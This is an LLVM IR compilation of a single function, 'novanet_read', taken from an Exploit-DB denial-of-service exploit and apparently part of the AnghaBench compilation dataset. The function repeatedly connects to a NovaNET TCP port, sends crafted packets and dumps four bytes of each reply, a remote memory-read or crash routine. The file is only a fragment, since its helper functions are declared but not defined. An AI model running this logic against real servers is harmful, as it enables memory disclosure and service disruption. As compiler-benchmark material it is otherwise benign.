; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_33876.c_novanet_read.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_33876.c_novanet_read.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [19 x i8] c"start: %p end: %p\0A\00", align 1
@.str.1 = private unnamed_addr constant [28 x i8] c"+hitting %s:%d. (%d times)\0A\00", align 1
@NOVANET_TCP_PORT = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@NOVANET_INT_IDX = common dso_local global i64 0, align 8
@USLEEP_TIME = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"..%d\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i8*, i8*, i8*, i32)* @novanet_read to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @novanet_read(i8* %0, i8* %1, i8* %2, i32 %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  store i32 %3, i32* %8, align 4
  %15 = load i32, i32* @BUF_SIZE, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %12, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %13, align 8
  %19 = load i32, i32* @BUF_SIZE, align 4
  %20 = zext i32 %19 to i64
  %21 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %14, align 8
  %22 = call i32 @novanet_pkt_init(i8* %18)
  %23 = load i8*, i8** %6, align 8
  %24 = ptrtoint i8* %23 to i32
  %25 = call i32 @NOVANET_CALC_INT(i32 %24)
  %26 = zext i32 %25 to i64
  %27 = inttoptr i64 %26 to i8*
  store i8* %27, i8** %6, align 8
  %28 = load i8*, i8** %7, align 8
  %29 = ptrtoint i8* %28 to i32
  %30 = call i32 @NOVANET_CALC_INT(i32 %29)
  %31 = zext i32 %30 to i64
  %32 = inttoptr i64 %31 to i8*
  store i8* %32, i8** %7, align 8
  %33 = load i32, i32* %8, align 4
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %39, label %35

35:                                               ; preds = %4
  %36 = load i8*, i8** %6, align 8
  %37 = load i8*, i8** %7, align 8
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0), i8* %36, i8* %37)
  br label %39

39:                                               ; preds = %35, %4
  %40 = load i32, i32* %8, align 4
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %43

42:                                               ; preds = %39
  br label %49

43:                                               ; preds = %39
  %44 = load i8*, i8** %7, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = ptrtoint i8* %44 to i64
  %47 = ptrtoint i8* %45 to i64
  %48 = sub i64 %46, %47
  br label %49

49:                                               ; preds = %43, %42
  %50 = phi i64 [ 1, %42 ], [ %48, %43 ]
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %11, align 4
  %52 = load i8*, i8** %5, align 8
  %53 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %54 = load i32, i32* %11, align 4
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i8* %52, i32 %53, i32 %54)
  store i32 0, i32* %10, align 4
  br label %56

56:                                               ; preds = %108, %49
  %57 = load i32, i32* %10, align 4
  %58 = load i32, i32* %11, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %113

60:                                               ; preds = %56
  %61 = load i8*, i8** %5, align 8
  %62 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %63 = call i32 @sockami(i8* %61, i32 %62)
  store i32 %63, i32* %9, align 4
  %64 = load i32, i32* %9, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

66:                                               ; preds = %60
  br label %113

67:                                               ; preds = %60
  %68 = load i32, i32* %8, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %72

70:                                               ; preds = %67
  %71 = call i32 @NOVANET_CALC_INT(i32 -559038737)
  br label %75

72:                                               ; preds = %67
  %73 = load i8*, i8** %6, align 8
  %74 = ptrtoint i8* %73 to i32
  br label %75

75:                                               ; preds = %72, %70
  %76 = phi i32 [ %71, %70 ], [ %74, %72 ]
  %77 = call i32 @NOVANET_SET_INT(i8* %18, i32 %76)
  %78 = load i32, i32* %9, align 4
  %79 = trunc i64 %16 to i32
  %80 = call i32 @sock_send(i32 %78, i8* %18, i32 %79)
  %81 = load i32, i32* %8, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %107, label %83

83:                                               ; preds = %75
  %84 = load i32, i32* %9, align 4
  %85 = trunc i64 %20 to i32
  %86 = call i32 @sock_recv(i32 %84, i8* %21, i32 %85)
  %87 = load i32, i32* @stderr, align 4
  %88 = call i32 @fileno(i32 %87)
  %89 = load i64, i64* @NOVANET_INT_IDX, align 8
  %90 = getelementptr inbounds i8, i8* %21, i64 %89
  %91 = call i32 @write(i32 %88, i8* %90, i32 4)
  %92 = load i32, i32* @USLEEP_TIME, align 4
  %93 = call i32 @usleep(i32 %92)
  %94 = load i32, i32* %9, align 4
  %95 = call i32 @close(i32 %94)
  %96 = load i32, i32* %10, align 4
  %97 = add nsw i32 %96, 1
  %98 = srem i32 %97, 8
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %104, label %100

100:                                              ; preds = %83
  %101 = load i32, i32* %10, align 4
  %102 = add nsw i32 %101, 1
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32 %102)
  br label %104

104:                                              ; preds = %100, %83
  %105 = load i32, i32* @stdout, align 4
  %106 = call i32 @fflush(i32 %105)
  br label %107

107:                                              ; preds = %104, %75
  br label %108

108:                                              ; preds = %107
  %109 = load i32, i32* %10, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %10, align 4
  %111 = load i8*, i8** %6, align 8
  %112 = getelementptr inbounds i8, i8* %111, i32 1
  store i8* %112, i8** %6, align 8
  br label %56

113:                                              ; preds = %66, %56
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  %115 = load i8*, i8** %12, align 8
  call void @llvm.stackrestore(i8* %115)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @novanet_pkt_init(i8*) #2

declare dso_local i32 @NOVANET_CALC_INT(i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @NOVANET_SET_INT(i8*, i32) #2

declare dso_local i32 @sock_send(i32, i8*, i32) #2

declare dso_local i32 @sock_recv(i32, i8*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @fileno(i32) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @fflush(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
